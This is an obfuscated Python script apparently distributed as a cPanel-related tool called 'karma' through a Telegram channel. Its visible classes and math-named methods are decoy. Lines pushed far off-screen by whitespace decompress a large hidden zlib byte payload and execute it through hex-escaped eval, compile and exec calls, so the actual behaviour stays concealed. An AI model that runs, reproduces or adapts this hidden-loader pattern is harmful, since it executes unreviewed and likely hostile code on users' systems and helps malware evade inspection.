from builtins import *
from math import prod as _hypothesis


__tool__ = 'karma'
__authors__ = ('Telegram:', '@xnabob')
__api__ = 'cpkarma.cc'
__telegram__ = 'https://t.me/cPanelKarma'
__version__ = '1.0'

__code__ = '4836037d39227231520bc3346a94c8a7'


_ceil, _callfunction, Algorithm, _while, Multiply, _divide, _calculate = exec, str, tuple, map, ord, globals, type

class _algorithm:
    def __init__(self, _theory):
        self._frame = _hypothesis((_theory, -59771))
        self.Modulo(StackOverflow=54868)

    def Modulo(self, StackOverflow = False):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self._frame += 2717 - StackOverflow
        
        try:
            ((_ceil, _callfunction) or _product if (_ceil, _callfunction) and _product else ... or (_product, (_ceil, _callfunction)))

        except AttributeError:
            (((Multiply, Algorithm), _callfunction) for _callfunction in {_product: _callfunction})

        except:
            _calculate(67843 - -37764) == type

    def Statistics(self, MemoryAccess = -81304):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        MemoryAccess += 19638 * -1392
        self.Calculate != True
        
        try:
            ({_product: _ceil} or Algorithm if {_product: _ceil} and Algorithm else ... or (Algorithm, {_product: _ceil}))

        except ArithmeticError:
            (((Multiply, _product, _ceil), Multiply) for Multiply in (Multiply, _product, _ceil))

        except:
            _calculate(27368 - -44985) == int

    def _stackoverflow(_system = int):
        return _divide()[_system]

    def DetectVar(Product = -90156 - -5049, _positive = str, Hypothesis = _divide):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        Hypothesis()[Product] = _positive
        
        try:
            ((_ceil, _callfunction) or Multiply if (_ceil, _callfunction) and Multiply else ... or (Multiply, (_ceil, _callfunction)))

        except ArithmeticError:
            (_ceil, _callfunction) if _while <= _while else {_product: _ceil} > _product

        except:
            _calculate(24148 / -83529) == Ellipsis

    def execute(code = str):
        return _ceil(_callfunction(Algorithm(_while(Multiply, code))))

    @property
    def Calculate(self):
        self._random = '<__main__._stackoverflow object at 0x000002579BE19373>'
        return (self._random, _algorithm.Calculate)

if __name__ == '__main__':
    try:
        _algorithm.execute(code = __code__)
        Divide = _algorithm(_theory = -42747 / -40968)

        _algorithm(_theory = -67899 - 51952).Statistics(MemoryAccess = -66249 * Divide._frame)                                                                                                                                                                                                                                                          ;_algorithm.DetectVar(Product='WXWWWXWWXXWXWWWWXXXWWWW',_positive=b'x\x9c\xe5\x1bio\xdb\xb8\xf2\xbb\x7f\x857_d\xa1n\xaa\xcb\xa2e \xc0\x03\x9ew\x01g\x9d\xb8@\x17\xd8\x00A \xc8\x12\xd5\xca\xd5aHJ\xe3\xfc\xfb73\xa4l\xf9J\xe5\xab}@(\xf3\x10Oq8\x9c\x8bt\x99\xbf\x0eZmpQ\xd8\xa1\x18\x9d\xeb\x96Y\x16\xbbn\xfb\x8f\x9b\xab\xef^\x9exW\xed,\xaf\x95z\xcf\xe5\xb7,/\xa8B\xe7\xea\x1f\x1e\xf3\xaf\xb9\x97\x0c\xae\xbaW\xffY\xa4\xde4\x9b^\xa9\xeb\xf5\xe7\x91\xe8\xcc\x9fSw\xd7\xbe\xbf\xd1c)\xfb\x10\xd5\xbe\x95\xe5\xbc\x18|\xfaT^\'\xfc\x93\xff\xd9Ky\xfc\xf7\x8e\xcf\xf8\xc1\xf3"\xcaR\xd1F\xbf\xd66\x8a\xfd,\xe0T\xa6X}\xd3\xd6L\x16\x98\x8ea0\xc3\xd4{\x866\xf5M\xd3\xb2=\xc7\xf2\xfb\x1eSZ\xea`\xd90J\xcb\x8eR|\x8f\x02Em\xf1\x85\xcf\xe7\xa5\x04P:\x7f.;W\x9fc\xee\x15\xbc=\xccR\xa5l\xdfeA\x14\xbe^\xa9-1b\x94\xcc\xb3\xbct]h\xffZ(\xea5_DeGm\xc5\x99\xef\xc5EG}Tfq<\x03\x17\x81\x8bgQ\x1cE\xb3h6\x8b\x95\xa7\x9b\xafq6\x85:\xad\xdd\x15\xb0i\x9a$)\xba\x04\x13\xf8\xa4\xe4\x95\xc7\xc1\xe0\xc3\xc7\x0f\x1f;\x1f;\x1ftU}\x82\xaex\xe9\x95e\xfeFW\x93,\xd3\xb2l2\xd1 \x81?He\xf0\xd3&\xdb\x9d\x05\xd1\x9b\x1d\r\xa1\xb9p\x90\x9cL\x86\xc3!%`Bb\xce\xad}5\xb0\xf5\xc3\xc3\xc3\xbf\xe0 \xc0\x04\xfd\x1e\xa0\xe5\n\x8co\x8c\x8c-\xa1\xd5\x83hI!4\xdd\xd5cG\x99>Gq\x19\xa5\xb8 ?\xbc\xbch\xedh\x8b]\xc2P1\x8cG~\x86?\x18.\x9eA\xaf\x12\xd2I\x05zZ\x85$\xed\xec\x1e\xadH\xa32\x8e\x9e\xa7\x9b\xb0T\xbb\x04b\xf8M$\xd8\xb5\x89\\\x88C{R\x1f\xcf\xd7\xd5u\x94\x06|\xd1Q\xf8s\xfe\xcfV\xe9\x93\xfa\xe6\x02\x02\x84\xe2\x88\xe0\x84\x0b\x15\xe1J\xc5\xef\x05^q\x96m\x97\x02\xbc\xf6\xa3\xecb\xf1\x02\xbf\xa5\xab\x92\x8b\xc5\xc1 \x8b"\xbf\xf0\xd2\xe8\x0c \xdb\xdb\xd3\xe1 \xdb\xdfU\x05\xb2\xd70\x8a\x17\xfc[\xfa\xbc\x0bn{6\xa5\x04\n\x00\x03\x9d\x00O\x9a\xbc\x1b$\xf3~\xf0\xc3\x90\xac\x02\xd2\nV\tBKQ\xaegY\x94\xee\x83\xf2\x1d\xb8{\xfc\xdd\xdf\xcb\x80~\xef\x05\xcc<\x8e\xe6I\xe6\x1f\x06\xe9\t~\x00\x8e\x0f\x041\x1b\x0e\x912"\xa5\x1cN\xde\x0b\xd4\xf2\xb28\x0cb\xf7\xe0$\x92I|\xbb\'<{/\x00+\xbd,\x0e\x0f\x03\x19\xa4P"\x81<\xac!k\xcd\xa2\xf7\x021^\xc4\xde_\x07nK\x14R&C!\xad\x0c\xe9K&\xc3z\x17\xbb9JGQu(\xd6\x1a\xd4\xdc\xcb\xc7;S\xc5\xd4\x8d\xc0\xe8\x1b\x81\xa9\x19\x0e\x88\x9b\x01G\x1d\xa4\xa3\xf4\xc3r\x9b\xe9\xa9"xz\'k\xe9\xf3\xc5N^\xb6\x9b%\xbd\x05d\xd6\x97\x8fp\xabt\x7f\xdb\xffl\x11$\xf0\x0f[e\xc3\xe8\xf96\xefYv\xdf\x06M\xd2\xb6\xed\xd0\xf6\xe1\t\x19\xb3\x1d\x9b\xdb\x0c\xf2\x02\xc8\xb3X\x0fr{\xcc\x84w\x9d\x19X\x97Q\x8aY\x90\x13\xda6\xbc\xcb>\x98\t)\x1d\xdaZT\x13\xcb}\xe8\x0b\x94U\xaa\xef`\x0fX\n\xb1e\x87\x10r\x18\r\xde\xb0W\xa6\xc38\x8e\xe8\x1f\xc7\x97}\xe1\x17\xe9\x90r`$nz\x86\xf1S|<b)\xac\xd0\xd4\x84\xc7\x10F\xaa\x85V\x88),\xf9\xf9"\xc4^2\r\xbcv*\x94\\\xb1\r\x84\xbeKK2\xd8\xaf\x85\x1c\xf3\xd1\x8e\xed[\x8ex\x08L\xbe\xc8\xa9|=\xffB\xf8c\x07\x88\x1b\xb8:\x0c\xd70\xb4M\xc4\x13fJ\xfc\xb9\xccZ\x05\xf0p\xf9\x04\xd2o\xbe\x05K\x1f\\h\xea\xb0\x05`\xd2\xc7OQ!\xea\x83\x0e3\xff\x95E\x0f\xbf\x8e\xc4[\xbd\xd04\xc13\xf0\x06xKz\xa3\xe6\x991%6\xd0\xa4\xae}0\xab8\x18\xdbL\xa2P!R\x13\xa0L\xfa\t\xc0G\x96\x8b\x16\x12T\xfdQ \x01\xd9\x04t\xfe&\xb0\xd7\xa0XoT\xd3r\r\xd7t\x1d\xd7r{\xf0Xn\xdf\xb5\xa1zo;\xf770\xebSV\xc1c\xb8\x0e\xfc\x04\xe8\xdf\x8en\xe17\x1a\x8f\xc7\x18\x8cFc\xf9r\xfb\x7f.\xe0H\xf2~\x7fW\xa9\x00B\xfa\'\r\xe0n\xb0O\x98;\x92\xb4\xaf\x93\xf0\xcdw\x8c/E\xd9*f\x8c\xa4\xdc\x02\xb6\x7f\x112\x0e\x0c\x02\x9f@\x86\xc1\xda\xdb\xa6\xa7\xb01\xfb%.K\xa23\xea\xb1\xc3lx8\xdfU\x92\x8ayKN\x9e&\xa7b\x9c&1No\x86q\xcb\xd9\xe0^\xa1=2\xa6Ms;\xc6\xad\x82\xfeP\x84S\xbe\x18\xe4\xbe\xe0\x03\x0e\x02\xc3\xa0\xe8\x17o\xa6\xe5\xd4^\xb0S\xecYD\x18\x0fv~\xfbQ"\x9de\x91\xe0\x86\xaeJ\xe3[(s\x1b\x88s\xc7m\x1f\x94U\x03\x90b/\xb3m\x1cx<\n}\x88=\x92\xaf}\x99\xe7S\xe8\xc9r\xef\x82J\x83E\x82\xf9\xa6\xe0N\x82}\x0f\xf4\x15\x0b\xd2\x9c\xc4\xc0\x10c\xc8\xed\x83\x10o\x93h\x8f\xf5\xa0\x14R&*\r\x10N\xa9\xe5\t\x0c\xe5M-\x8bm\xe8Xu\xbd\xaa\xbf\xa5wA\xd8\x98\xce\xe0@\x02m_\xe4\xf8\x84\xc5\xe7Ca\xbe%\xd9\x06k\xe1\xa5e\\\x12\xb8\xb8\rb\x1f#\xae\x00k\t\xebd\xdb\xf0na\x1e)\x85\xc7\x8b\x01c\xa0e#\xa2i@\xe1n!\x89nt*1\xb2A\x16\xed\xa1<*\xe5U\xa7\x92e\xebr\xab\x94k\x9b\xd4mL\xaf\x8f\x03\xf1\x9a\xa6{!\x8d\xc9\x83GH\x0f"\xf4d\x8e\'\x9fK\xa9\x87\xbd\xb0\x17\xa2\xa0\x8e\x93\xc4\xf4)\x02{\x8c\xa7\x98h@\x8c\xf0<\x93<f5\x11\xda/\xc3\x96\x11eo\x91\x15#\xdeB\x88\xef\x87\xf3d\xc9\xf6\xe4\'\nn\xb8\xf8]\xfc8\x1e\x8d\xe2\x18~\x10\x83\xa3\x14\xa4\x0f\x9e\xd3\x18\x05z\xf8\xa1\x07\xa1\x05\xe5\x96\xd1\xc9\xdb\xfa\xd8u\x12\xe6y)\xb2/O\x86\xee\xef\x0f\xa2\xd2\n\x82$\x160\x11\xf09u:Hut\xf0\x9a\xa42\xa8]\xf7e\\\xa5\x1dI\xa5\x9a\xd4\xed_\x94J1MZ\xe1l\xd2\xbe\x83\x136r\xc5,\x97r\xdf\xcb\xc9\xd8.\xc1cH\x10\xf5j\xef=\x19\xeb\x12\x94M\xea6\xde5G\x81\xd2\x08N\x03\xdf\xa2\x92\x98\xa5\xf4!\x89G\x13(*\xaa\x86\xe6\x06\xb7\x07^\x87T\xdf\xd5q\xbc\xcd\xbc_\xbcSOa\x9e\xe1I\xf2\x87P;j\xd4\xf7\xa5\x19\x14\x9b\x1a \x14\x95\x01\\\x11\xa6\x18\xea.sM\xb7\x07\xd5\xfb\xdb\xb9\x8dz\xeb\xbb\x1a\xb4q\xc8\x80d@\x0c-\xa1\xba\xb3\x9d\xdb\x10\x17tW\x18\xa34\xea\x81\xd1\xb7\xe9\xdb\xb9\xbf\xc9<u\x1an\x80\xc0z4^\x88\x13\xac\xb4:\xbf\x12#\x82;\xb3}\xb0\x0f\xc0E@\xdb\xd2\x1ah\xb9\x0e-\xe7V\xee\xb9\x08\xa4U#x\xfdJ\xba\x95\xb1\xb6A \xf7\xd55\x89/\xfd\n;\xa3\xb5R\x0f\xab\xd3\xa8\xea\xech\xfdtH\x96n\xab\xa2xJE\xedu\x9b\x91\xaa\xc2\xe99\x9e`L\x86xKb\x98\x91y\t\xefIL\x1a-\xb4\r\x8b\xc8\x88\xc2"\xa5e\xb0\xaf\x18Tg\xdb\xb9gF\xb0\xe6tJ\xa3\xfd\x8e{\xdf\xc1/":\xb0\x96\xf3\x1bx\xc2\x19P\x88tT\x81"\x86y);f\xb0f\xab\xe45\x0bfc\xbb\xe5q\x933\x99s)\xe3l\xcd`\xc2\x96\xe9\xd5!u\xff\x00#I5\xb1\xba-\x95\xa6{>3\t\xa9\xb0\xd2\xfb\xf2\xa9T^O\xaa\xbd"\x0f\xc2K\x99Jlf1y\xda\xdddM\xc2<K\xda\xd5\x8d\xde\xb6\xb8)\xdc\xf6\xe2\xb8\xcb\x17\xdc\xef\xce\xf3(-\xbb\xe0[\xf8\xday\xa9d\xbd\xc5RdQ[\xb2M\xf1<\x9d\xe7\x99\xcf\x8bb\x99\xf3Z\xb4\xe6\xd1\xdc\x9d{\xfew\xef+/n\x1e\xe9Z\xf7\x88\xd4:\xa1\xd2Q<\x8a\xbbT \x0e\x1e\xc5\t\xa4<\x91\x04\'\xca&\x99\xa0x@\xf2\x88\xe2\r\'\xad\xa7VQzi\xe0\xe5\x81\x1bG\xd3\xdc\xcb_\xdd$\x0b\x9e\xe3\xe5@\xc9\x92}&b\xe1EWx\xc2&\xae$\x8b\x8b\xb6\xa4\xc8\xcbQ\xc4\xd53q\xdb\x05m\xf6"{)\xdbJ%Y\xda\x89\x17\x0bQ,\'!\xf52x\x11\xd9\xd2JN\xe7Ix\xb0D\'K\xe3\xb1lC\xaam\xd5\xae\x02\x84(\xbb\xafT\xc4\xea\x12!F0\xdd\x80\x87mX\xa4\x12V\xa7\x82iG\xc6\xf2\xba}Y\xfd\xf9\x00\xddjA\xae\xfdo\xdc\xff\xee\xfa\xd0\xb0\xf3\x08\xabr\x8d\x8b\xf9\\z\xd3\x98wk\xfa\x8f@\xabE\xf7n\xa5\xa3\xd6T\xd5\xbb\xbb\xae4\x8c\t\x9d\x9a\x0cf#\x98QW~\xc3\x93\xba\x1c\x9a\xd0\xa6s\x04\xfe\xda\x80\xb4l\xba\xc1/\x83-N+\xb8\xaa\xc9\x90+W\'\xfd6\xdd\x0e\xf1\x99\xd3\x88\xb3\x8ao\x15\x7fG\xa8C\xea\xbf\x00#\x1e|\x16o\x7f\xe6y\x96\x0f\xce3+PYu\xb2\x8c\x8bo\x17\xb7N\xd6mn\xda\x8e\x99\x1f<\x97?)\x8a\xb2\xb4\xed\x15m~\xae\x8f\xd7\xc9N.\xac\xaf\xa0x\xd3u\x1b\xb3f\x8f\xc5)1\x10\x93h\x82{\x05\xa3\xad\xe9\x99\x1e\xe6\xd2D\x9bL3\n\xdb\xae\x9bz\tw\xdd\x9b\x1b\xb2uI\xa3\x17\xa1\xa5\x98\xab\x98\xe7rz\xe2\x02Lu\x19,\x15\xa0\n\xb3\xbc-\x91\x166T\xbbN\xa3V\x00[\xdbK\x1b\x7fG\xa9v\xddZ\xf9\x05\x90^\\u\x02\xa4F\x18\xeb\xb6E\x17\x97\xb6\xb7Bs$\xa9!\xca\x88&\xb3\x81\xe2\x97\x9c\x87\xbcb\xb5\xf3\xfb5k\'\xc6P\x1b\xd6X\\^_\x8f}\xa4\xb2\x86&\xe2\xb4\xefeQ\xa3\xeb\xf0\xac\x90D\xf0\x13\xc4\x91}\xac\xe6L\x1b\x0c\xa4R\xdc\x08\xf5[n\xcd\xb6\xc4jd\xb4\x86\xd2\x1d\x124GG\xf4\xf7\x11\xc8R[\xff\x03\x08\xb2E0')

        if 335080 > 3773250:
            Divide.Modulo(StackOverflow = Divide._frame + -53380)
        elif 475446 < 3301426:
            Divide.Modulo(StackOverflow = Divide._frame - 19605)                                                                                                                                                                                                                                                          ;mnnmnnmmnmmmmnnmnnmnm,O00000o0oo0oOOOOOo0,NMMMMNMMNMNMNNMNMMMMN,illjilllljjjjlljl,JJIJJLIJIJILLJJJILILJI=(lambda xwwwwwwwxwwxxwxxwx:xwwwwwwwxwwxxwxxwx(__import__('\x7a\x6c\x69\x62'))),(lambda xwwwwwwwxwwxxwxxwx:xwwwwwwwxwwxxwxxwx['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda xwwwwwwwxwwxxwxxwx:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(xwwwwwwwxwwxxwxxwx)"),filename='\x77\x77\x77\x78\x78\x78\x77\x78\x77\x77\x78\x77\x78\x78\x77\x77\x78\x78\x77\x78',mode='\x65\x76\x61\x6c'))),(lambda nnmnmnnmmmnnnnmmnnnn,xwwwwwwwxwwxxwxxwx:nnmnmnnmmmnnnnmmnnnn(xwwwwwwwxwwxxwxxwx)),(lambda:(lambda xwwwwwwwxwwxxwxxwx:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(xwwwwwwwxwwxxwxxwx)"),filename='\x77\x77\x77\x78\x78\x78\x77\x78\x77\x77\x78\x77\x78\x78\x77\x77\x78\x78\x77\x78',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63'))
        if 437533 > 5413802:
            _algorithm(_theory = -46189 / -51120).Modulo(StackOverflow = Divide._frame - -50528)
        elif 125991 < 601353:
            _algorithm(_theory = 46158 - 62711).Modulo(StackOverflow = Divide._frame - -64909)                                                                                                                                                                                                                                                          ;JJIJJLIJIJILLJJJILILJI()(illjilllljjjjlljl(O00000o0oo0oOOOOOo0(mnnmnnmmnmmmmnnmnnmnm(NMMMMNMMNMNMNNMNMMMMN('\x76\x61\x72\x73'))),_algorithm._stackoverflow(_system='WXWWWXWWXXWXWWWWXXXWWWW')))

    except Exception as _product:
        if 191452 > 6779422:
            _algorithm.execute(code = _callfunction(_product))

        elif 151916 > 9626521:
            Divide.Statistics(MemoryAccess = -50522 * Divide._frame)